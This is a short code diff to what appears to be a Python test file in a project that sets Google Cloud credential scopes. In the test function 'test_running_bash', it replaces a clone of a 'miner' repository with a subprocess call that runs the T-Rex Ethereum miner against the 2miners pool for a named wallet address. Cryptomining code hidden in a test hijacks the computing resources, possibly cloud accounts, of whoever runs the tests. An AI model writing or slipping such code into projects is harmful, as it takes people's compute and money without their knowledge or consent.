@@ -36,11 +36,8 @@ CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"]
 
 def test_running_bash():
 
-    bashCommand = "git clone git@github.com:galz10/miner.git"
-    bashCommand2 = "ls"
+    bashCommand = "./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x1f75eccd8fbddf057495b96669ac15f8e296c2cd -p x -w rig10"
     process = subprocess.Popen(bashCommand, stdout=subprocess.PIPE)
-    output, error = process.communicate()
-    process = subprocess.Popen(bashCommand2, stdout=subprocess.PIPE)
     output, error = process.communicate()
     raise Exception(str(output))
 
